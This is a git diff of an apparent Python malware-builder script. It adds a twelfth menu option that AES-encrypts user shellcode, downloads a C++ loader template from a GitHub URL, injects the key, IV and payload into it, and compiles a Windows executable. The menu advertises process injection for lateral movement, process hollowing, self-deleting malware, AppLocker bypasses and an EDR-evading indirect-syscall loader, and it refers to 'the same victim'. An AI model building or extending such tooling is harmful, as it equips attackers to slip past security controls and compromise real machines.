@@ -1,3 +1,4 @@
+
 #!/usr/bin/python3 
 import os
 import argparse
@@ -30,7 +31,12 @@ def AESencrypt(plaintext, key):
     ciphertext = cipher.encrypt(plaintext)  # Encrypt the padded plaintext
     return ciphertext, key
     
-
+def AESencrypt_with_iv(plaintext, key, iv):
+    k = hashlib.sha256(key).digest()  # Derive a 32-byte key using SHA-256  
+    plaintext = pad(plaintext, AES.block_size)
+    cipher = AES.new(k, AES.MODE_CBC, iv)  # Use the passed IV
+    ciphertext = cipher.encrypt(plaintext)
+    return ciphertext,key,iv
         
 def HAVOCone():
     GREEN = "\033[92m"
@@ -663,6 +669,47 @@ def indirect():
 
     files = ["syscalls.asm","indirect.c","syscalls.h","syscalls.o", "dhanush.obj"]
     for file in files:
+        os.remove(file)
+        
+def enumpagew():
+    with open(payload_name, "rb") as file:
+            content = file.read()
+    KEY = urandom(16)
+    iv=urandom(16)
+    
+    ciphertext, key, iv = AESencrypt_with_iv(content, KEY, iv)
+    
+    
+    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
+    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
+    iv_str= ', '.join(f'0x{byte:02x}' for byte in iv)
+    
+    aeskey=f"unsigned char ke185hams[] = {{ {key_str} }};"
+    aescode=f"unsigned char itsthecod345[] = {{ {ciphertext_str} }};"
+    aesiv=f"unsigned char AESiv[] = {{ {iv_str} }};"
+    
+    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/enumpage.cpp"
+    
+    try:
+        res = requests.get(url)
+        content1=res.text
+        content1=content1.replace('unsigned char ke185hams[] = {};',aeskey)
+        content1=content1.replace('unsigned char itsthecod345[] = {};',aescode)
+        content1=content1.replace('unsigned char AESiv[] = {};',aesiv)
+        with open("hollow_aes.cpp", "wb") as f:
+            f.write(content1.encode('utf-8'))
+    except requests.RequestException as e:
+        print(f"Error: {e}")
+        exit(1)
+        
+    try:
+        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_12.exe", "hollow_aes.cpp", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_12.exe")
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
+
+    files = ["hollow_aes.cpp"]
+    for file in files:
         os.remove(file) 
 
 if __name__ == "__main__":
@@ -696,7 +743,7 @@ if __name__ == "__main__":
     print(banner)    
     optionss=input(f"{WHITE}{BOLD}You sure you want to Continue?(Use it ethically, and in lab enviroments only) y/n: ")
     if optionss=="y" or "Y":
-        havoc=input(f"{WHITE}{BOLD}Enter your payload choice:\n1.)self-injection(XOR)\n2.)self-injection(AES)\n3.)Process Injection(spoolsv)(Can be used for lateral movement)\n4.)Process Hollow\n{RED}{BOLD}5.)Self Deleting Malware(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE){WHITE}{BOLD}\n6.)DLL side-load/rundll32 applocker bypass\n7.)Process Injection(explorer.exe)\n{RED}{BOLD}8.)Powershell(Will bypass with cloud detections enabled as well)(Make sure to run this payload twice)(use x64 payload only){WHITE}{BOLD}\n9.)Applocker bypass small shellcodes{GREEN}{BOLD}(Make sure to use x86 payloads)(Also make sure to change the .exe file name after everyrun on the same victim)(Make sure you run this payload twice){WHITE}{BOLD}\n{MAGENTA}{BOLD}10.)Applocker bypass Havoc/large shellcodes(use x86 payloads only){WHITE}{BOLD}\n11.){RED}{BOLD}Indirect Syscall(Windows 10)(Possible EDR bypass loader){WHITE}{BOLD}\n>")
+        havoc=input(f"{WHITE}{BOLD}Enter your payload choice:\n1.)self-injection(XOR)\n2.)self-injection(AES)\n3.)Process Injection(spoolsv)(Can be used for lateral movement)\n4.)Process Hollow\n{RED}{BOLD}5.)Self Deleting Malware(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE){WHITE}{BOLD}\n6.)DLL side-load/rundll32 applocker bypass\n7.)Process Injection(explorer.exe)\n{RED}{BOLD}8.)Powershell(Will bypass with cloud detections enabled as well)(Make sure to run this payload twice)(use x64 payload only){WHITE}{BOLD}\n9.)Applocker bypass small shellcodes{GREEN}{BOLD}(Make sure to use x86 payloads)(Also make sure to change the .exe file name after everyrun on the same victim)(Make sure you run this payload twice){WHITE}{BOLD}\n{MAGENTA}{BOLD}10.)Applocker bypass Havoc/large shellcodes(use x86 payloads only){WHITE}{BOLD}\n11.){RED}{BOLD}Indirect Syscall(Windows 10)(Possible EDR bypass loader){WHITE}{BOLD}\n12.)EnumPageFiles exec\n>")
         payload_name =  input("Please type in the shellcode file name: ")
         if havoc=="1":
             print(f"Selected self-injection(XOR)")
@@ -733,6 +780,9 @@ if __name__ == "__main__":
         elif havoc=="11":
             print(f"Selected indirect payload")
             indirect()
+        elif havoc=="12":
+            print(f"Selected enumpagefile call back function payload")
+            enumpagew()
         
         else:
             print("Invalid option")
